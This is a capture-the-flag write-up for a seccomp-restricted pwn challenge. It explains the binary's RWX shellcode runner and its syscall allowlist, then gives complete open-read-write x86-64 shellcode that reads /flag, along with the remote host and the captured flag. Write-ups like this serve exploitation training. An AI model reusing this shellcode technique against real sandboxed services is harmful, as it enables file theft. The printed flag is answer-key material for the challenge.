---
challenge: vault
category: pwn
techniques: [seccomp-analysis, orw-shellcode, mmap-rwx-execution]
time_to_flag: 2
status: solved
---

# Vault — Seccomp Restricted ORW Shellcode Writeup

## 1. Challenge Overview
- **Binary:** `vault` (64-bit ELF, x86-64, dynamically linked)
- **Target OS:** Ubuntu 24.04 LTS (`glibc 2.39`)
- **Remote Host:** `nc pwn.h7tex.com 41598`
- **Provided Files:**
  - `vault`: Challenge binary
  - `libc.so.6`: Target system C library
  - `ld-linux-x86-64.so.2`: Matching dynamic linker
  - `README.txt`: Deployment details

## 2. Binary Mitigation Audit (checksec)
- **Arch:** x86-64 Little Endian (`ET_EXEC`)
- **PIE:** Disabled (fixed base `0x400000`, entry point `0x401150`)
- **Stack Canary:** Enabled in helper functions
- **NX:** Enabled
- **RELRO:** Partial RELRO

## 3. Vulnerability & Program Logic
- In `main()` (`0x401319`):
  1. Allocates an RWX memory page via:
     ```c
     void *buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
     ```
  2. Prompts: `"send your shellcode (up to 4096 bytes), then EOF:"`.
  3. Reads raw user shellcode: `read(0, buf, 0x1000)`.
  4. Calls `lockdown()` (`0x401236`).
  5. Jumps directly into user memory: `((void(*)())buf)();`.

## 4. Seccomp Filter Audit (`lockdown()`)
Decompiling `lockdown()`:
- Initializes libseccomp filter: `seccomp_init(SCMP_ACT_KILL)`
- Whitelists only 14 specific syscalls using `seccomp_rule_add(ctx, SCMP_ACT_ALLOW, syscall, 0)`:
  - `257` (`openat`)
  - `2` (`open`)
  - `0` (`read`)
  - `1` (`write`)
  - `3` (`close`)
  - `8` (`lseek`)
  - `5` (`fstat`)
  - `262` (`newfstatat`)
  - `9` (`mmap`)
  - `11` (`munmap`)
  - `12` (`brk`)
  - `15` (`rt_sigreturn`)
  - `60` (`exit`)
  - `231` (`exit_group`)
- Disallowed syscalls, specifically `execve` (59) and `execveat` (322), immediately terminate the process with `SIGSYS` / kill.

## 5. Exploitation Strategy (Open-Read-Write Shellcode)
Because `execve` is killed, but file I/O syscalls (`open`, `read`, `write`) are allowed, we craft a compact 48-byte x86-64 Open-Read-Write (ORW) shellcode targeting `/flag`:
1. `sys_open("/flag", O_RDONLY)`:
   ```nasm
   push 0
   movabs rax, 0x67616c662f    ; "/flag"
   push rax
   mov rdi, rsp
   xor esi, esi                ; O_RDONLY = 0
   xor edx, edx
   mov eax, 2                  ; __NR_open
   syscall
   ```
2. `sys_read(fd, rsp, 128)`:
   ```nasm
   mov edi, eax                ; fd returned by sys_open
   mov rsi, rsp
   mov edx, 128
   xor eax, eax                ; __NR_read
   syscall
   ```
3. `sys_write(1, rsp, bytes_read)`:
   ```nasm
   mov edx, eax                ; bytes read
   mov edi, 1                  ; stdout
   mov rsi, rsp
   mov eax, 1                  ; __NR_write
   syscall
   ```
4. `sys_exit(0)`:
   ```nasm
   xor edi, edi
   mov eax, 60                 ; __NR_exit
   syscall
   ```

Send the shellcode over socket, execute `s.shutdown(socket.SHUT_WR)` to signal EOF, and receive the flag.

## 6. Retrieved Flag
```text
H7CTF{e424fd5a-7cc1-406b-9b8e-6754c8d7c73c}
```
